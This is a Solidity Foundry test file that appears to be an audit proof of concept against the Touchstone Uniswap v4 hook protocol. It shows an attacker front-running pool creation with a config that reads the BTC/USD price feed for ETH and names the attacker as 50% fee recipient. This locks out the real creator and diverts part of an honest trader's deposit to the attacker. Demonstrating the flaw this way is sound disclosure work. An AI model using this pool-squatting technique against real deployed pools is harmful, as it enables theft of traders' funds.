// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {console2} from "forge-std/console2.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";
import {IHooks} from "v4-core/interfaces/IHooks.sol";
import {Currency} from "v4-core/types/Currency.sol";
import {PoolKey} from "v4-core/types/PoolKey.sol";
import {TouchstoneFixture} from "ts/test/utils/TouchstoneFixture.sol";
import {ITouchstoneErrors} from "ts/src/interfaces/ITouchstoneErrors.sol";
import {PoolConfig} from "ts/src/types/PoolConfig.sol";
import {Record} from "ts/src/types/Record.sol";
import {Payout} from "ts/src/types/Payout.sol";

contract PoolSquatTest is TouchstoneFixture {
    address attacker = makeAddr("attacker");
    bytes32 constant BTC_ID = keccak256("BTC/USD");

    function setUp() public {
        _deployCore();
        decQuote = 6; decRisky = 18;
        quote = Currency.wrap(address(new MockERC20("Quote", "Q", 6)));
        risky = Currency.wrap(address(0));
        quoteIs0 = false;
        key = PoolKey({currency0: risky, currency1: quote, fee: FEE, tickSpacing: TICK_SPACING, hooks: IHooks(address(hook))});
        id = key.toId();
        _fund(address(this));
        _fund(trader);

        // The attacker front-runs the canonical ETH/USDC key with a config that passes every bound
        // but names the BTC/USD Pyth feed as the base, and itself as the 50% protocol recipient.
        PoolConfig memory c = defaultConfig();
        c.basePriceId = BTC_ID;
        c.protocolRecipient = attacker;
        c.protocolShareBps = 5_000;
        vm.prank(attacker);
        factory.createPool(key, c, _sqrtPriceAt(ETH_USD));
        _addLiquidity(key, liquidity());
    }

    function test_PoC_LegitCreatorLockedOut() public {
        vm.expectRevert(abi.encodeWithSelector(ITouchstoneErrors.Touchstone__AlreadyRegistered.selector, id));
        factory.createPool(key, defaultConfig(), _sqrtPriceAt(ETH_USD));
    }

    function test_PoC_HonestTradeClawedBackToAttacker() public {
        // An ordinary $20k ETH buy at the fair price $3,000; deposit is taken in ETH.
        vm.roll(block.number + 1);
        vm.recordLogs();
        _swap(trader, true, true, 20_000 * 10 ** decQuote, "");
        (Record memory r, bool found) = _lastRecord();
        assertTrue(found);
        uint64 t0 = uint64(r.timestamp) + 3;
        vm.warp(t0);
        bytes[] memory u = new bytes[](2);
        // Pyth: ETH is still $3,000, BTC is $60,000. The pool's config makes the Settler read BTC as P*.
        u[0] = pyth.encode(BTC_ID, 60_000e8, 0, -8, t0, t0 - 1);
        u[1] = pyth.encode(QUOTE_ID, 1e8, 0, -8, t0, t0 - 1);
        vm.prank(keeper, keeper);
        Payout memory p = settler.settle(r, u);
        console2.log("deposit       ", r.deposit);
        console2.log("refund        ", p.refund);
        console2.log("to attacker   ", p.toProtocol);
        console2.log("to LPs+rebate ", uint256(p.toLPs) + p.toRebatePool);
        assertEq(ledger.owed(attacker, key.currency0), p.toProtocol);
        assertGt(p.toProtocol, r.deposit / 4);
    }
}
